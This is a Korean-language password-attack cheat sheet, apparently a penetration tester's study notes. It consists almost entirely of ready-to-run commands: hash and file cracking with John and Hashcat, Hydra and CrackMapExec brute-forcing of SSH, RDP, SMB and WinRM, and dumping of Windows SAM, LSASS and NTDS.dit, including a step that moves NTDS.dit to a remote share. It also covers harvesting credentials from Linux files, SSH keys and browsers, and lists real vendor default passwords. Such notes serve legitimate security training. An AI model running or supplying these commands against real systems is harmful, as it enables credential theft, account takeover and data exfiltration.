# 1. John The Ripper

### Single Crack Mode
```john --format=<hash_type> <hash or hash_file>```

### Wordlist Mode
```john --wordlist=<wordlist_file> --rules <hash_file>```

### Incremental Mode (문자 조합 사용)
```john --incremental <hash_file>```

### 해시 식별
- [JtR의 샘플 해시 문서](https://openwall.info/wiki/john/sample-hashes) 나 [PentestMonkey의 이 목록을](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) 참조
- [hashID](https://github.com/psypanda/hashID)와 같은 도구를 사용
```$ hashid -j 193069ceb0461e1d40d216e32c79c704```

### 파일 Cracking
```
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
  또는
john --wordlist=<wordlist.txt> server_doc.hash
```
| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

- 툴 위치 검색 : ```$ locate *2john*```

<br/><br/>
# 2. Remote Password Attacks

### CrackMapExec(NetExec) - WinRM
```crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
예) ```crackmapexec winrm 192.168.1.1 -u user.list -p password.list```

### Evil-WinRM
```evil-winrm -i <target-IP> -u <username> -p <password>```<br/>
예) ```evil-winrm -i 192.168.1.1 -u user -p password```

### Hydra - SSH
```hydra -L user.list -P password.list ssh://192.168.1.1```

### Hydra - RDP
```hydra -L user.list -P password.list rdp://192.168.1.1```

### Hydra - SMB
```hydra -L user.list -P password.list smb://192.168.1.1```

### MSF - SMB (SMBv3)
```msf6 > use auxiliary/scanner/smb/smb_login```

### CrackMapExec(NetExec) - SMB Share
```crackmapexec smb 192.168.1.1 -u "user" -p "password" --shares```

### Smbclient
```smbclient -U user \\\\192.168.1.1\\SHARENAME```

<br/><br/>
# 3. Password 변형

### Hashcat Rule 기반 Wordlist 생성
```
ls /usr/share/hashcat/rules/
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```
```hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list```

### CeWL를 이용한 Wordlist 생성
```cewl https://www.domain.com -d 4 -m 6 --lowercase -w inlane.wordlist```

### Anarchy를 이용한 Custom Username 생성
```./username-anarchy -i /home/user/names.txt```<br/>
예) ```./username-anarchy john marston > username.txt```

<br/><br/>
# 4. Password 재사용 / 기본 Passwords

### Credential Stuffing
[DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
| **Product/Vendor** | **Username** | **Password**                 |
| ------------------ | ------------ | ---------------------------- |
| Zyxel (ssh)        | zyfwp        | PrOw!aN_fXp                  |
| APC UPS (web)      | apc          | apc                          |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | weblogic     | weblogic1                    |
| Weblogic (web)     | WEBLOGIC     | WEBLOGIC                     |
| Weblogic (web)     | PUBLIC       | PUBLIC                       |
| Weblogic (web)     | EXAMPLES     | EXAMPLES                     |
| Weblogic (web)     | weblogic     | weblogic                     |
| Weblogic (web)     | system       | password                     |
| Weblogic (web)     | weblogic     | welcome(1)                   |
| Weblogic (web)     | system       | welcome(1)                   |
| Weblogic (web)     | operator     | weblogic                     |
| Weblogic (web)     | operator     | password                     |
| Weblogic (web)     | system       | Passw0rd                     |
| Weblogic (web)     | monitor      | password                     |
| Kanboard (web)     | admin        | admin                        |
| Vectr (web)        | admin        | 11_ThisIsTheFirstPassword_11 |
| Caldera (web)      | admin        | admin                        |
| Dlink (web)        | admin        | admin                        |
| Dlink (web)        | 1234         | 1234                         |
| Dlink (web)        | root         | 12345                        |
| Dlink (web)        | root         | root                         |
| JioFiber           | admin        | jiocentrum                   |
| GigaFiber          | admin        | jiocentrum                   |
| Kali linux (OS)    | kali         | kali                         |
| F5                 | admin        | admin                        |
| F5                 | root         | default                      |
| F5                 | support      |                              |
| ...                | ...          | ...                          |
|                    |              |                              |

### Credential Stuffing - Hydra
```hydra -C <user_pass.list> <protocol>://<IP>```

### Default Credentials
[Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

<br/><br/>
# 5. Windows Local Password Attacks

## Attacking SAM
#### reg.exe로 Registry Hives 복사
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

#### Impacket's secretsdump.py로 Dumping Hashes
```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
secretsdump 출력 : (uid:rid:lmhash:nthash)

#### Hashcat으로 Cracking Hashes (NT Hash)
```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```

### Remote Dumping
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>

<br/><br/>
## Attacking Lsass
### PowerShell을 이용한 lsass.dmp
```
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Pypykatz를 사용하여 LSASS 프로세스 덤프
```pypykatz lsa minidump ./lsass.dmp```
<br/><br/>
## Attacking NTDS.dit
### Evil-WinRM, Vssadmin를 이용한 NTDS.dit 복사
```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\192.168.1.1\Share
```

### Crackmapexec를 이용한 NTDS.dit 덤프
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --ntds```

<br/><br/>
## 자격증명 검색

### Lazagne 사용하여 자격증명 검색
```start lazagne.exe all```

### findstr 사용하여 자격증명 검색
```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml```

<br/><br/>
# 6. Linux Local Password Attacks

## 파일 검색

### 구성 파일 검색
```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

### 구성 파일에서 자격증명 검색 (예 : .cnf)
```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```

### DB 파일 검색
```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```

### 노트 검색 (확장자가 없는 파일 포함)
```find /home/* -type f -name "*.txt" -o ! -name "*.*"```

### 스크립트 검색
```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```

### Cronjobs 검색
```cat /etc/crontab```<br/>
```ls -la /etc/cron.*/```

### SSH Private Keys 검색
```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```

### SSH Public Keys 검색
```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```

### Bash History 확인
```tail -n5 /home/*/.bash*```

### Log에서 특정 문자열 검색
```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```
<br/><br/>
## Memory & Cache 검색

### Memory - Mimipenguin
```python3 mimipenguin.py```

### Memory - LaZagne
```python2.7 laZagne.py all```
<br/><br/>
## Browsers 검색

### Firefox에 저장된 자격증명 검색
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

### Firefox에 저장된 자격증명 Decrypt
```python3.9 firefox_decrypt.py```

### Browsers - LaZagne
```python3 laZagne.py browsers```
<br/><br/>
## Shadow 파일
- `$<type>$<salt>$<hashed>`

### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

### 저장된 오래된 비밀번호 확인
```cat /etc/security/opasswd```
<br/><br/>
## Shadow 파일

### Unshadow, Hashcat으로 Cracking
```
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Hashcat으로 MD5 Hash Cracking
```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```

<br/><br/>
# 7. Cracking Files

### SSH Key Cracking
```
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

### Cracking Documents
```
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
```

### Cracking PDFs
```
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
```

### Cracking ZIP
```
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

### Cracking OpenSSL Encrypted Archives (예 : .gzip)
```
file GZIP.gzip 
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives
```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```
